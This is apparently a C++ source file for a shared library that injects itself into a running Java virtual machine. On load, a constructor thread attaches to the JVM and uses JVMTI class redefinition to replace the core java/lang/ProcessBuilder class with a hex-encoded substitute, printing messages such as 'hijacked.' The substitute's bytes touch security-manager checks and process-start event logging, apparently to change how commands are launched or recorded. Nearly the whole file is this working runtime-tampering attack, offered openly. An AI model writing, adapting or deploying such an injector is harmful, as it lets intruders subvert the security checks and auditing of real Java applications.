#include <iostream>
#include <jni.h>
#include <stdio.h>
#include <dlfcn.h>
#include "jvmti.h"
#include <pthread.h>

const char* targetClassHex = "cafebabe0000003d01b40a000200030700040c000500060100106a6176612f6c616e672f4f626a6563740100063c696e69743e01000328295607000801001e6a6176612f6c616e672f4e756c6c506f696e746572457863657074696f6e0a0007000309000b000c07000d0c000e000f0100186a6176612f6c616e672f50726f636573734275696c646572010007636f6d6d616e640100104c6a6176612f7574696c2f4c6973743b0700110100136a6176612f7574696c2f41727261794c6973740a001000130c00050014010004284929560b001600170700180c0019001a01000e6a6176612f7574696c2f4c697374010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a0a001c001d07001e0c001f00200100106a6176612f6c616e672f53797374656d01001267657453656375726974794d616e6167657201001d28294c6a6176612f6c616e672f53656375726974794d616e616765723b07002201001b6a6176612f6c616e672f52756e74696d655065726d697373696f6e080024010008676574656e762e2a0a002100260c00050027010015284c6a6176612f6c616e672f537472696e673b29560a0029002a07002b0c002c002d0100196a6176612f6c616e672f53656375726974794d616e6167657201000f636865636b5065726d697373696f6e01001d284c6a6176612f73656375726974792f5065726d697373696f6e3b295609000b002f0c0030003101000b656e7669726f6e6d656e7401000f4c6a6176612f7574696c2f4d61703b0a003300340700350c0030003601001c6a6176612f6c616e672f50726f63657373456e7669726f6e6d656e7401001128294c6a6176612f7574696c2f4d61703b09000b00380c0039003a01001324617373657274696f6e7344697361626c65640100015a07003c0100186a6176612f6c616e672f417373657274696f6e4572726f720a003b00030a0033003f0c00400041010010656d707479456e7669726f6e6d656e740100122849294c6a6176612f7574696c2f4d61703b0a004300440700450c004600470100106a6176612f6c616e672f537472696e67010007696e6465784f6601000428492949080049010004c0802e2a08004b0100000a0043004d0c004e004f01000c7265706c6163654669727374010038284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0a004300510c0046005201000528494929490a004300540c00550056010009737562737472696e67010016284949294c6a6176612f6c616e672f537472696e673b0a004300580c005500590100152849294c6a6176612f6c616e672f537472696e673b0b005b005c07005d0c005e005f01000d6a6176612f7574696c2f4d6170010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b09000b00610c006200630100096469726563746f727901000e4c6a6176612f696f2f46696c653b09000b00650c006600670100097265646972656374730100245b4c6a6176612f6c616e672f50726f636573734275696c6465722452656469726563743b0700690100216a6176612f6c616e672f50726f636573734275696c646572245265646972656374090068006b0c006c006d010004504950450100234c6a6176612f6c616e672f50726f636573734275696c6465722452656469726563743b0a0068006f0c007000710100047479706501002a28294c6a6176612f6c616e672f50726f636573734275696c64657224526564697265637424547970653b09007300740700750c007600770100266a6176612f6c616e672f50726f636573734275696c646572245265646972656374245479706501000557524954450100284c6a6176612f6c616e672f50726f636573734275696c64657224526564697265637424547970653b09007300790c007a0077010006415050454e4407007c0100226a6176612f6c616e672f496c6c6567616c417267756d656e74457863657074696f6e07007e0100176a6176612f6c616e672f537472696e674275696c6465720a007d000308008101001e526564697265637420696e76616c696420666f722072656164696e673a200a007d00830c00840085010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b0a007d00870c0084008801002d284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f537472696e674275696c6465723b0a007d008a0c008b008c010008746f537472696e6701001428294c6a6176612f6c616e672f537472696e673b0a007b00260a000b008f0c0066009001002628295b4c6a6176612f6c616e672f50726f636573734275696c6465722452656469726563743b09007300920c009300770100045245414408009501001e526564697265637420696e76616c696420666f722077726974696e673a200a006800970c0098009901000466726f6d010033284c6a6176612f696f2f46696c653b294c6a6176612f6c616e672f50726f636573734275696c6465722452656469726563743b0a000b009b0c009c009d01000d7265646972656374496e70757401003f284c6a6176612f6c616e672f50726f636573734275696c6465722452656469726563743b294c6a6176612f6c616e672f50726f636573734275696c6465723b0a0068009f0c00a00099010002746f0a000b00a20c00a3009d01000e72656469726563744f75747075740a000b00a50c00a6009d01000d72656469726563744572726f7209006800a80c00a9006d010007494e48455249540a00ab00ac0700ad0c00ae00af0100106a6176612f7574696c2f41727261797301000466696c6c010028285b4c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b295609000b00b10c00b2003a01001372656469726563744572726f7253747265616d0a000b00b40c00b500b60100057374617274010039285b4c6a6176612f6c616e672f50726f636573734275696c6465722452656469726563743b294c6a6176612f6c616e672f50726f636573733b0b001600b80c00b900ba01000473697a650100032829490b001600bc0c00bd00be010007746f4172726179010028285b4c6a6176612f6c616e672f4f626a6563743b295b4c6a6176612f6c616e672f4f626a6563743b0700c00100135b4c6a6176612f6c616e672f537472696e673b0a00bf00c20c00c300c4010005636c6f6e6501001428294c6a6176612f6c616e672f4f626a6563743b0a002900c60c00c70027010009636865636b457865630a00c9008a0700ca01000c6a6176612f696f2f46696c650700cc0100136a6176612f696f2f494f457863657074696f6e0800ce010021696e76616c6964206e756c6c2063686172616374657220696e20636f6d6d616e640a00cb00260a00d100d20700d30c00b500d40100156a6176612f6c616e672f50726f63657373496d706c01006e285b4c6a6176612f6c616e672f537472696e673b4c6a6176612f7574696c2f4d61703b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f50726f636573734275696c6465722452656469726563743b5a294c6a6176612f6c616e672f50726f636573733b0700d60100246a646b2f696e7465726e616c2f6576656e742f50726f6365737353746172744576656e740a00d500030a00d500d90c00da00db0100096973456e61626c656401000328295a0700dd0100166a6176612f7574696c2f537472696e674a6f696e65720800df010001200a00dc00e10c000500e201001b284c6a6176612f6c616e672f4368617253657175656e63653b29560a00dc00e40c001900e5010032284c6a6176612f6c616e672f4368617253657175656e63653b294c6a6176612f7574696c2f537472696e674a6f696e65723b0900d500e70c006200e80100124c6a6176612f6c616e672f537472696e673b0a00dc008a0900d500eb0c000e00e80a00ed00ee0700ef0c00f000f10100116a6176612f6c616e672f50726f6365737301000370696401000328294a0900d500f30c00f000f40100014a0a00d500f60c00f70006010006636f6d6d69740800f90100023a200a00fb00fc0700fd0c00fe008c0100136a6176612f6c616e672f457863657074696f6e01000a6765744d6573736167650a002901000c01010027010009636865636b5265616407010301001b6a6176612f6c616e672f5365637572697479457863657074696f6e08010501001443616e6e6f742072756e2070726f6772616d2022080107010001220801090100102028696e206469726563746f7279202208010b01000222290a00cb010d0c0005010e01002a284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f5468726f7761626c653b29560b001601100c011101120100036765740100152849294c6a6176612f6c616e672f4f626a6563743b0a000b01140c009c011501002528294c6a6176612f6c616e672f50726f636573734275696c6465722452656469726563743b0801170100436275696c646572207265646972656374496e7075742829206d75737420626520504950452065786365707420666f7220746865206669727374206275696c6465723a200a000b01190c00a3011508011b0100436275696c6465722072656469726563744f75747075742829206d75737420626520504950452065786365707420666f7220746865206c617374206275696c6465723a2007011d0100296a6176612f6c616e672f50726f636573734275696c64657224526564697265637450697065496d706c0a011c000312000001200c0121012201000661636365707401001f28294c6a6176612f7574696c2f66756e6374696f6e2f436f6e73756d65723b0b001601240c01250126010007666f7245616368010020284c6a6176612f7574696c2f66756e6374696f6e2f436f6e73756d65723b295612000101200a00ed01290c012a00ba01000777616974466f7207012c01001e6a6176612f6c616e672f496e746572727570746564457863657074696f6e0a012e012f0701300c013101320100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b0a012e01340c01350006010009696e746572727570740a013701380701390c013a00db01000f6a6176612f6c616e672f436c61737301001664657369726564417373657274696f6e5374617475730100095369676e61747572650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b0100354c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b3e3b010013284c6a6176612f7574696c2f4c6973743b2956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001a4c6a6176612f6c616e672f50726f636573734275696c6465723b0100164c6f63616c5661726961626c65547970655461626c6501000d537461636b4d61705461626c65010027284c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b2956010016285b4c6a6176612f6c616e672f537472696e673b295601000361726701002c284c6a6176612f7574696c2f4c6973743b294c6a6176612f6c616e672f50726f636573734275696c6465723b010040284c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b294c6a6176612f6c616e672f50726f636573734275696c6465723b01002f285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573734275696c6465723b01001228294c6a6176612f7574696c2f4c6973743b01002628294c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b010008736563757269747901001b4c6a6176612f6c616e672f53656375726974794d616e616765723b01003728294c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b3e3b01000765716c7369676e01000149010009656e76737472696e67010004656e767001001028294c6a6176612f696f2f46696c653b01002a284c6a6176612f696f2f46696c653b294c6a6176612f6c616e672f50726f636573734275696c6465723b010006736f7572636501000b64657374696e6174696f6e01000466696c65010009696e6865726974494f01001c28294c6a6176612f6c616e672f50726f636573734275696c6465723b01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b01001528294c6a6176612f6c616e672f50726f636573733b01000a457863657074696f6e73010001730100184c6a6176612f7574696c2f537472696e674a6f696e65723b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b0100056576656e740100264c6a646b2f696e7465726e616c2f6576656e742f50726f6365737353746172744576656e743b010002736501001d4c6a6176612f6c616e672f5365637572697479457863657074696f6e3b01000d657863657074696f6e496e666f01000563617573650100154c6a6176612f6c616e672f5468726f7761626c653b010001650100154c6a6176612f6c616e672f457863657074696f6e3b010008636d64617272617901000470726f670100036469720700670701710100136a6176612f6c616e672f5468726f7761626c6501000d7374617274506970656c696e65010022284c6a6176612f7574696c2f4c6973743b294c6a6176612f7574696c2f4c6973743b0100076275696c646572010005696e64657801000a707265764f757470757401000265780100086275696c6465727301000b6e756d4275696c6465727301000970726f63657373657301002c4c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f50726f636573734275696c6465723b3e3b0100254c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f50726f636573733b3e3b010053284c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f50726f636573734275696c6465723b3e3b294c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f50726f636573733b3e3b0100166c616d626461247374617274506970656c696e652430010016284c6a6176612f6c616e672f50726f636573733b295601000269650100204c6a6176612f6c616e672f496e746572727570746564457863657074696f6e3b010001700100083c636c696e69743e01000a536f7572636546696c6501001350726f636573734275696c6465722e6a61766101000b4e6573744d656d626572730701880100236a6176612f6c616e672f50726f636573734275696c646572245265646972656374243607018a0100236a6176612f6c616e672f50726f636573734275696c646572245265646972656374243507018c0100236a6176612f6c616e672f50726f636573734275696c646572245265646972656374243407018e0100236a6176612f6c616e672f50726f636573734275696c64657224526564697265637424330701900100236a6176612f6c616e672f50726f636573734275696c64657224526564697265637424320701920100236a6176612f6c616e672f50726f636573734275696c64657224526564697265637424310701940100296a6176612f6c616e672f50726f636573734275696c646572244e756c6c4f757470757453747265616d0701960100286a6176612f6c616e672f50726f636573734275696c646572244e756c6c496e70757453747265616d010010426f6f7473747261704d6574686f64730f0601990a019a019b07019c0c019d019e0100226a6176612f6c616e672f696e766f6b652f4c616d6264614d657461666163746f727901000b6d657461666163746f72790100cc284c6a6176612f6c616e672f696e766f6b652f4d6574686f6448616e646c6573244c6f6f6b75703b4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f696e766f6b652f4d6574686f64547970653b4c6a6176612f6c616e672f696e766f6b652f4d6574686f64547970653b4c6a6176612f6c616e672f696e766f6b652f4d6574686f6448616e646c653b4c6a6176612f6c616e672f696e766f6b652f4d6574686f64547970653b294c6a6176612f6c616e672f696e766f6b652f43616c6c536974653b1001a0010015284c6a6176612f6c616e672f4f626a6563743b29560f0501a20a00ed01a30c01a4015d01000f64657374726f79466f726369626c7910017f0f0601a70a000b01a80c017e017f01000c496e6e6572436c6173736573010008526564697265637401000454797065010010526564697265637450697065496d706c0100104e756c6c4f757470757453747265616d01000f4e756c6c496e70757453747265616d0701b00100256a6176612f6c616e672f696e766f6b652f4d6574686f6448616e646c6573244c6f6f6b75700701b201001e6a6176612f6c616e672f696e766f6b652f4d6574686f6448616e646c65730100064c6f6f6b75700031000b0002000000060002000e000f0001013b00000002013c00020062006300000002003000310001013b00000002013d000200b2003a0000000200660067000010180039003a0000001b00010005013e0002013f0000008100020002000000162ab700012bc7000bbb000759b70009bf2a2bb5000ab10000000401450000000f0001ff0010000207000b07001600000140000000160005000000d3000400d4000800d5001000d6001500d701410000001600020000001601420143000000000016000e000f000101440000000c000100000016000e013c0001013b0000000201460081000501470001013f000000a500040006000000382ab700012abb0010592bbeb70012b5000a2b4d2cbe3e03360415041da2001b2c1504323a052ab4000a1905b90015020057840401a7ffe5b1000000030145000000150002ff0019000507000b0700bf0700bf010100001d01400000001a0006000000e4000400e5001100e6002500e7003100e6003700e801410000002000030025000c014800e800050000003801420143000000000038000e00c000010001000e01490002013f0000006e00020002000000132bc7000bbb000759b70009bf2a2bb5000a2ab00000000401450000000300010c0140000000120004000000f6000400f7000c00f8001100f901410000001600020000001301420143000000000013000e000f000101440000000c000100000013000e013c0001013b00000002014a0081000e014b0001013f0000009400040006000000352abb0010592bbeb70012b5000a2b4d2cbe3e03360415041da2001b2c1504323a052ab4000a1905b90015020057840401a7ffe52ab00000000301450000000b0002fe00150700bf01011d014000000016000500000108000d01090021010a002d01090033010b01410000002000030021000c014800e800050000003501420143000000000035000e00c000010001000e014c0002013f0000002f00010001000000052ab4000ab00000000201400000000600010000011701410000000c000100000005014201430000013b00000002014d0001003000360002013f00000099000400020000003db8001b4c2bc600102bbb0021591223b70025b600282ab4002ec7000a2ab80032b5002eb200379a00122ab4002ec7000bbb003b59b7003dbf2ab4002eb00000000301450000000a0003fc00150700290d1401400000001e000700000160000401610008016200150164001c0165002301670038016901410000001600020000003d01420143000000040039014e014f0001013b00000002015000000030014b0001013f0000013c0005000700000093b200379a00122ab4002ec6000bbb003b59b7003dbf2bc6007b2a2bbeb8003eb5002eb200379a00122ab4002ec7000bbb003b59b7003dbf2b4d2cbe3e03360415041da2004f2c1504323a05190503b60042029f000e19051248124ab6004c3a051905103d03b6005036061506029f001e2ab4002e1905031506b60053190515060460b60057b9005a030057840401a7ffb12ab00000000301450000002300061521fe00070700bf0101fc0020070043fc002a01ff0005000207000b0700bf000001400000003e000f0000016e0015016f001901700022017100370173004b017a0055017b0060017d0065017e006a0180007001810082018200850181008b01730091018501410000002a0004006a0021015101520006004b0040015300e800050000009301420143000000000093015400c000010001006201550001013f0000002f00010001000000052ab40060b00000000201400000000600010000019501410000000c0001000000050142014300000001006201560001013f0000003f00020002000000072a2bb500602ab00000000201400000000a0002000001a6000501a7014100000016000200000007014201430000000000070062006300010002006600900001013f0000006100050001000000262ab40064c7001d2a06bd00685903b2006a535904b2006a535905b2006a53b500642ab40064b00000000301450000000300012101400000000e0003000002da000702db002102df01410000000c0001000000260142014300000001009c009d0001013f0000008600040002000000382bb6006eb20072a5000d2bb6006eb20078a6001ebb007b59bb007d59b7007f1280b600822bb60086b60089b7008dbf2ab6008e032b532ab0000000030145000000040002141a0140000000160005000002fa000b02fb001402fc002f02fe003602ff014100000016000200000038014201430000000000380157006d0001000100a3009d0001013f00000077000400020000002e2bb6006eb20091a6001ebb007b59bb007d59b7007f1294b600822bb60086b60089b7008dbf2ab6008e042b532ab000000003014500000003000125014000000012000400000319000a031a0025031c002c031d01410000001600020000002e0142014300000000002e0158006d0001000100a6009d0001013f00000077000400020000002e2bb6006eb20091a6001ebb007b59bb007d59b7007f1294b600822bb60086b60089b7008dbf2ab6008e052b532ab00000000301450000000300012501400000001200040000033b000a033c0025033e002c033f01410000001600020000002e0142014300000000002e0158006d00010001009c01560001013f0000003d00020002000000092a2bb80096b6009ab00000000201400000000600010000035001410000001600020000000901420143000000000009015900630001000100a301560001013f0000003d00020002000000092a2bb8009eb600a1b00000000201400000000600010000036101410000001600020000000901420143000000000009015900630001000100a601560001013f0000003d00020002000000092a2bb8009eb600a4b000000002014000000006000100000372014100000016000200000009014201430000000000090159006300010001009c01150001013f0000004b00020001000000142ab40064c70009b2006aa700092ab400640332b00000000301450000000700020d4507006801400000000600010000038001410000000c000100000014014201430000000100a301150001013f0000004b00020001000000142ab40064c70009b2006aa700092ab400640432b00000000301450000000700020d4507006801400000000600010000038e01410000000c000100000014014201430000000100a601150001013f0000004b00020001000000142ab40064c70009b2006aa700092ab400640532b00000000301450000000700020d4507006801400000000600010000039c01410000000c0001000000140142014300000001015a015b0001013f0000003a000200010000000c2ab6008eb200a7b800aa2ab00000000201400000000a0002000003b6000a03b701410000000c00010000000c014201430000000100b200db0001013f0000002f00010001000000052ab400b0ac000000020140000000060001000003c901410000000c000100000005014201430000000100b2015c0001013f0000003f00020002000000072a1bb500b02ab00000000201400000000a0002000003db000503dc0141000000160002000000070142014300000000000700b2003a0001000100b5015d0002013f0000003300020001000000092a2ab40064b600b3b00000000201400000000600010000043101410000000c000100000009014201430000015e00000004000100cb000200b500b60002013f000004650005000d000001ab2ab4000a2ab4000ab900b70100bd0043b900bb0200c000bf4d2cb600c1c000bf4d2c4e2dbe360403360515051504a2001c2d1505323a061906c7000bbb000759b70009bf840501a7ffe32c03324eb8001b3a041904c6000919042db600c52ab40060c7000701a7000a2ab40060b600c83a052c3a061906be360703360815081507a2002319061508323a09190903b600429b000dbb00cb5912cdb700cfbf840801a7ffdc2c2ab4002e19052b2ab400b0b800d03a06bb00d559b700d73a071907b600d8990055bb00dc5912deb700e03a082c3a091909be360a03360b150b150aa200181909150b323a0c1908190cb600e357840b01a7ffe719071905b500e619071908b600e9b500ea19071906b600ecb500f21907b600f51906b03a06bb007d59b7007f12f8b600821906b600fab60082b600893a0719063a081906c100cb99001b1904c6001619042db600ffa7000d3a09124a3a0719093a08bb00cb59bb007d59b7007f130104b600822db60082130106b600821905c70008124aa7001ebb007d59b7007f130108b600821905b6008213010ab60082b60089b600821907b60082b600891908b7010cbf000300a4011a011b00cb00a4011a011b007b0147014d0150010200030145000001480011ff002a000607000b07016f0700bf0700bf01010000fc0019070043fa0005ff0013000607000b07016f0700bf0700430700290100000a46070043ff000c000907000b07016f0700bf0700430700290700430700bf01010000fc0020070043fa0005ff0037000c07000b07016f0700bf0700430700290700430700ed0700d50700dc0700bf010100001bff001f000807000b07016f0700bf0700430700290700430700ed0700d50000ff0002000707000b07016f0700bf07004307002907004307000200010700fbff0034000907000b07016f0700bf0700430700290700430700fb0700430700fb000107010209ff0024000907000b07016f0700bf0700430700290700430700fb0700430700fb000308015a08015a07007dff001a000907000b07016f0700bf0700430700290700430700fb0700430700fb000408015a08015a07007d07004301400000009a00260000043f001904400021044200370443003c044400440442004a0446004e04490053044a0058044b005e044d0072044f008b045000940451009e044f00a4045600b5045b00be045c00c6045d00d1045e00ea045f00f2045e00f8046100ff0462010904630113046401180466011b0467011d046801360469013a046a0147046d014d04710150046e0152046f01560470015a0475017504770141000000a200100037000d014800e80006008b0013015f00e8000900ea0008015f00e8000c00d10047000e0160000800b5006601610162000600be005d0163016400070152000801650166000901360075016700e80007013a0071016801690008011d008e016a016b0006000001ab014201430000000001ab00660067000100190192016c00c00002004e015d016d00e8000300530158014e014f000400720139016e00e80005015e00000004000100cb0009017201730003013f0000021300040007000000de2ab900b701003cbb0010591bb700124d014e03360415042ab900b70100a200a32a1504b9010f0200c0000b3a051905b6008e3a0615049e00331905b60113b2006aa50023bb007b59bb007d59b7007f130116b600821905b60113b60086b60089b7008dbf1906032d5315041b0464a200391905b60118b2006aa50023bb007b59bb007d59b7007f13011ab600821905b60118b60086b60089b7008dbf190604bb011c59b7011e532c19051906b600b3b90015020057190604324e840401a7ff58a7001c4e2cba011f0000b9012302002cba01270000b9012302002dbf2cb00001001000c000c300fb000401450000003b0008ff0015000507001601070010070068010000fd004e07000b07016f04320af90018ff000200030700160107001000010700fbfd0018070068010140000000660019000004f9000704fa001004fc001204fd002004fe002d04ff0034050000390502004405030057050500640507006905090071050b007c050c008f050e009c051000a7051200b5051300ba04fd00c0052100c3051500c4051700cf051800da052000dc05220141000000520008002d008d01740143000500340086006600670006001500ab017501520004001200ae0176006d000300c400180177016b0003000000de0178000f0000000700d7017901520001001000ce017a000f00020144000000160002000000de0178017b0000001000ce017a017c0002015e00000004000100cb013b00000002017d100a017e017f0001013f0000006900010002000000102ab6012857a7000a4cb8012db60133b10001000000050008012b000301450000000700024807012b0601400000001600050000051a0005051e0008051b0009051d000f051f014100000016000200090006018001810001000000100182016200000008018300060001013f000000340001000000000011120bb601369a000704a7000403b30037b10000000201450000000500020c40010140000000060001000000c0000401a900000062000c0068000b01aa04090073006801ab4019011c000b01ac00080193000b01ad00080195000b01ae000801870000000000000189000000000000018b000000000000018d000000000000018f000000000000019100000000000001af01b101b300190184000000020185019700000016000201980003019f01a101a501980003019f01a601a5018600000018000b011c0068007301870189018b018d018f019101930195";
const char* targetClassName = "java/lang/ProcessBuilder";

unsigned char hexToByte(const char* hex) {
    unsigned int byte;
    sscanf(hex, "%02x", &byte);
    return (unsigned char)byte;
}

void hexStringToByteArray(const char* hexString, unsigned char* byteArray, int byteArrayLength) {
    for (int i = 0; i < byteArrayLength; i++) {
        byteArray[i] = hexToByte(hexString + 2 * i);
    }
}

void* library_init(void* arg);

static void __attribute__((constructor))
init() {
    pthread_t tid;
    int err = pthread_create(&tid, NULL, &library_init, NULL);
    if (err != 0) {
        std::cerr << "Oula Failed to create a thread: " << strerror(err) << std::endl;
    }
}

void* library_init(void* arg) {
    JavaVM *vmBuf[1];
    jsize numVMs;
    jvmtiEnv *jvmti;

    jint result = JNI_GetCreatedJavaVMs(vmBuf, 1, &numVMs);
    std::cout << "Number of JVMs found : " << numVMs << std::endl;

    if (result == JNI_OK && numVMs > 0) {
        JavaVM *jvm = vmBuf[0];
        JNIEnv *env;
        int length = strlen(targetClassHex) / 2;
        unsigned char classBytes[length];
        hexStringToByteArray(targetClassHex, classBytes, length);
        jint attachResult = jvm->AttachCurrentThread(reinterpret_cast<void **>(&env), nullptr);

        if (attachResult == JNI_OK) {
            printf("JVM attached yay hehe \n");
            jvm->GetEnv((void **) &jvmti, JVMTI_VERSION_1_1);
            jvmtiCapabilities capabilities;
            memset(&capabilities, 0, sizeof(capabilities));
            capabilities.can_redefine_classes = 1;
            jvmti->AddCapabilities(&capabilities);
            jclass clazz = env->FindClass(targetClassName);
            if (clazz == nullptr) {
                std::cerr << "Failed to find the class: " << std::endl;
                jvm->DetachCurrentThread();
            }
            jvmtiClassDefinition classDef;
            classDef.klass = clazz;
            classDef.class_byte_count = length;
            classDef.class_bytes = classBytes;
            std::cerr << "hijacked. " << std::endl;
            jvmtiError err = jvmti->RedefineClasses(1, &classDef);
            if (err != JVMTI_ERROR_NONE) {
                char *errName = nullptr;
                jvmti->GetErrorName(err, &errName);
                std::cerr << "Failed to redefine the class. JVMTI Error Code: " << err;
                if (errName != nullptr) {
                    std::cerr << " (" << errName << ")";
                    jvmti->Deallocate((unsigned char *) errName);
                }
                std::cerr << std::endl;
            }
            jvm->DetachCurrentThread();
        } else {
            std::cerr << "Failed to attach thread to JVM. Error code: " << attachResult << std::endl;
            switch (attachResult) {
                case JNI_EDETACHED:
                    std::cerr << "Thread not attached to the JVM." << std::endl;
                    break;
                case JNI_EVERSION:
                    std::cerr << "JVM version error." << std::endl;
                    break;
                default:
                    std::cerr << "Unknown error occurred." << std::endl;
            }
        }
    } else {
        std::cerr << "MMMhh No JVMs found :/" << std::endl;
    }
}
